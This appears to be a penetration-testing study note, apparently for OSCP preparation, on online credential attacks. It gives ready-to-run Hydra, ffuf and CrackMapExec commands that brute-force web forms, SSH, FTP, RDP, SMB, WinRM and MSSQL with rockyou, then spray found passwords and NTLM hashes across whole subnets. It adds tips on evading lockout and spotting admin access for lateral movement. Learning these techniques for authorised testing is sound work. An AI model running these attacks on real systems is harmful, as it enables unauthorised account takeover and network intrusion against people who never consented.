---
status: working
tags:
  - credentials
  - brute-force
  - spraying
---
> *Online Credential Attacks:* Brute-forcing a login interface and spraying a found credential across the whole network. Trigger: (a) a login interface, (b) a username list, or (c) any credential at all. Credential reuse is the single most reliable mechanic on most internal networks, the instant you get one credential, test it everywhere before doing anything else.

## Protocol Brute / Spray with Hydra + CME

Read the login form first so you get the field names and failure string right.

```bash
# HTTP POST form
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials"
# HTTP basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /admin
# FTP / SSH (keep threads low, they throttle) / RDP
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 4
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://$IP
# SMB / WinRM via CME
crackmapexec smb $IP -u users.txt -p /usr/share/wordlists/rockyou.txt
crackmapexec winrm $IP -u users.txt -p /usr/share/wordlists/rockyou.txt
```

> [!note]
> `^USER^`/`^PASS^` are substitution markers. `F=<string>` is the text on a failed login, Hydra treats anything without it as success, use `S=<string>` when matching success is easier. Keep SSH/RDP threads low (`-t 4`), they lock or drop under parallelism. ffuf is a good fallback when Hydra mangles a complex form: `ffuf -u http://$IP/login -X POST -d 'user=admin&pass=FUZZ' -w rockyou.txt -fc 200`.

## Spray Found Creds Across the Whole Network

The core loop, the instant you get one credential test it against every host and protocol.

```bash
crackmapexec smb 10.10.10.0/24 -u user -p 'Pass123' --continue-on-success
crackmapexec winrm 10.10.10.0/24 -u user -p 'Pass123'
crackmapexec mssql 10.10.10.0/24 -u user -p 'Pass123' --local-auth
crackmapexec smb $IP -u user -H <NTLM> --local-auth       # validate a hash
```

> [!note]
> In CME output, `+` means valid, `Pwn3d!` means admin/code-execution on that host (an immediate lateral target). `--continue-on-success` maps every box the cred works on. `--local-auth` authenticates against the local SAM, use it for local-admin reuse and to avoid domain lockout while spraying a hash. Also try password-as-username and username == password, lazy admins are common.

## See Also

- [[Hash Cracking]] for cracking anything you dump, then spray the plaintext
- [[Wordlists and Generation]] for the lists these consume
- [[Finding Credentials]] and [[Post-Exploitation Loot Loop]] for the reuse cycle
- [[AD Attacks]] for the AD-specific spraying (mind the lockout policy)
- Source: [[OSCP Field Manual]] section 2.3
